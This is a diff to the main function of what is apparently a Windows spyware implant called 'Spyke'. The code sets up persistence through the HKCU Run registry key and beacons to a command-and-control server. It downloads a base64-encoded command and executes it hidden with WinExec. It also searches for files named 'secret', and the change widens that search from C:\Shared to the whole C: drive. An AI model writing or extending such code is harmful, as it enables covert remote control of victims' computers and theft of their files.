@@ -27,13 +27,15 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 
 	
 	HKEY hKey;
+	
 	if(RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
 	{
 		//Checking if the registry value exists
 
 		DWORD dwType = REG_SZ;
 		DWORD dwBufSize = sizeof(buf);
-		if(RegQueryValueEx(hKey, L"Spyke", 0, &dwType, (LPBYTE)buf, &dwBufSize) != ERROR_SUCCESS)
+		if(RegQueryValueEx(hKey, L"foobar", 0, &dwType, (LPBYTE)buf, &dwBufSize) != ERROR_SUCCESS)
+		//if (RegQueryValueEx(hKey, L"Spyke", 0, &dwType, (LPBYTE)buf, &dwBufSize) != ERROR_SUCCESS)
 			// Creating the registry value for autoloading
 			utils.Autoload();
 	}
@@ -63,10 +65,10 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 	{
 		utils.GenerateID();
 	}
-
+	
 	// sending an initial message to C&C
 	conn.HTTPPost(utils.GetID(), "I am alive!");
-
+	
 	// getting a command from C&C and starting
 	conn.HTTPGet("/cmd");
 	vector<BYTE> cmvec = base.base64_decode(conn.GetBuffer());
@@ -74,7 +76,7 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 	WinExec(command.c_str(), SW_HIDE);
 	
 	vector<string> files;
-	FindByFilename("secret", "C:\\Shared", files);
+	FindByFilename("secret", "C:\\", files);
 	for (string file : files)
 	{
 		stringstream ss;
